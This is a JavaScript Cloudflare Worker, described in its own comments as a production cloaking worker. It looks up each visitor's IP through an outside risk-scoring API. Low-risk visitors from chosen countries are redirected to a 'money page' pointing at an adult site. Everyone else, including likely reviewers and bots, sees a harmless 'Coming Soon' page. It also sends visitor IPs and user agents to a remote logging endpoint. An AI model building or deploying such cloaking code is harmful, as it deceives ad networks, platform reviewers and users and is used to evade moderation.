// Production JCI API Cloaking Worker for Cloudflare
// This worker calls the real JCI API and makes routing decisions

const JCI_USER_ID = 'e68rqs0to5i24lfzpov5je9mr';
const MONEY_URL = 'https://www.xnxx.com'; // Will be replaced dynamically
const TARGET_COUNTRIES = ['Germany', 'Netherlands']; // Will be replaced dynamically

const SAFE_PAGE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coming Soon</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            max-width: 500px;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, #fff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; }
        .loader {
            width: 50px; height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 768px) {
            h1 { font-size: 2rem; }
            p { font-size: 1rem; }
            .container { margin: 1rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Coming Soon</h1>
        <p>We're working on something amazing. Stay tuned!</p>
        <div class="loader"></div>
    </div>
</body>
</html>`;

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  console.log('🔍 Production Worker handling request for:', request.url);
  
  const visitorIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  const userAgent = request.headers.get('User-Agent') || 'unknown';
  const requestUrl = new URL(request.url);
  const domain = requestUrl.hostname;
  
  console.log('👤 Visitor IP:', visitorIP);
  console.log('🌐 Domain:', domain);
  
  try {
    // Call JCI API to check visitor eligibility
    const jciResponse = await callJciApi(visitorIP, userAgent);
    
    if (jciResponse.success) {
      console.log('✅ JCI API Success:', jciResponse.data);
      
      // Check if visitor should see money page
      const shouldShowMoney = isEligibleForMoneyPage(jciResponse.data);
      
      if (shouldShowMoney) {
        console.log('💰 Redirecting to money page');
        
        // Log decision
        await logDecision({
          ip: visitorIP,
          userAgent: userAgent,
          decision: 'MONEY_PAGE',
          reason: 'JCI_APPROVED',
          jciResponse: jciResponse.data,
          error: null,
          domain: domain
        });
        
        // Redirect to money page
        return Response.redirect(MONEY_URL, 302);
      } else {
        console.log('🛡️ Showing safe page (blocked by filters)');
        
        // Log decision
        await logDecision({
          ip: visitorIP,
          userAgent: userAgent,
          decision: 'SAFE_PAGE',
          reason: 'JCI_BLOCKED',
          jciResponse: jciResponse.data,
          error: null,
          domain: domain
        });
        
        // Show safe page
        return new Response(SAFE_PAGE_HTML, {
          headers: { 
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'X-Worker-Status': 'safe-page-served'
          }
        });
      }
    } else {
      console.log('❌ JCI API Failed:', jciResponse.error);
      
      // Log API failure
      await logDecision({
        ip: visitorIP,
        userAgent: userAgent,
        decision: 'SAFE_PAGE',
        reason: 'JCI_API_FAILED',
        jciResponse: null,
        error: jciResponse.error,
        domain: domain
      });
      
      // Show safe page on API failure
      return new Response(SAFE_PAGE_HTML, {
        headers: { 
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'X-Worker-Status': 'api-error'
        }
      });
    }
    
  } catch (error) {
    console.error('💥 Worker Error:', error.message);
    
    // Log worker error
    await logDecision({
      ip: visitorIP,
      userAgent: userAgent,
      decision: 'SAFE_PAGE',
      reason: 'WORKER_ERROR',
      jciResponse: null,
      error: error.message,
      domain: domain
    });
    
    // Show safe page on worker error
    return new Response(SAFE_PAGE_HTML, {
      headers: { 
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'X-Worker-Status': 'worker-error'
      }
    });
  }
}

// Function to call JCI API
async function callJciApi(ip, userAgent) {
  try {
    console.log('📡 Calling JCI API for IP:', ip);
    
    const jciUrl = 'https://jci-api.com/validate?user_id=' + JCI_USER_ID + '&ip=' + encodeURIComponent(ip);
    
    const response = await fetch(jciUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent || 'Mozilla/5.0 (compatible; CloudflareWorker/1.0)'
      }
    });
    
    if (!response.ok) {
      throw new Error('JCI API returned status ' + response.status);
    }
    
    const data = await response.json();
    console.log('📊 JCI Response:', JSON.stringify(data));
    
    return {
      success: true,
      data: data
    };
    
  } catch (error) {
    console.error('❌ JCI API Error:', error.message);
    return {
      success: false,
      error: error.message,
      data: null
    };
  }
}

// Function to determine if visitor is eligible for money page
function isEligibleForMoneyPage(jciData) {
  try {
    // Check if JCI data indicates visitor should be blocked
    if (jciData.risk_score && parseFloat(jciData.risk_score) > 70) {
      console.log('🚫 High risk score:', jciData.risk_score);
      return false;
    }
    
    // Check country targeting
    if (jciData.country) {
      const visitorCountry = jciData.country.toUpperCase();
      
      // If target countries specified, visitor must be from target country
      if (TARGET_COUNTRIES.length > 0) {
        const isTargetCountry = TARGET_COUNTRIES.some(country => 
          country.toUpperCase() === visitorCountry
        );
        if (!isTargetCountry) {
          console.log('🌍 Visitor country not in target list:', visitorCountry);
          return false;
        }
      }
    }
    
    // Add more filtering logic here as needed
    // For now, if we reach here, visitor is eligible
    console.log('✅ Visitor eligible for money page');
    return true;
    
  } catch (error) {
    console.error('❌ Error in eligibility check:', error.message);
    return false; // Default to safe page on error
  }
}

// Function to log decisions to the database
async function logDecision(logData) {
  try {
    const logUrl = 'https://webpage-creator.vercel.app/api/jci-logs';
    
    console.log('📡 Logging decision to:', logUrl);
    
    const response = await fetch(logUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ...logData,
        timestamp: new Date().toISOString(),
        workerVersion: 'production-1.0'
      })
    });
    
    if (!response.ok) {
      console.warn('⚠️ Failed to log decision:', response.status);
    } else {
      console.log('📝 Decision logged successfully');
    }
  } catch (error) {
    console.warn('⚠️ Logging error:', error.message);
  }
} 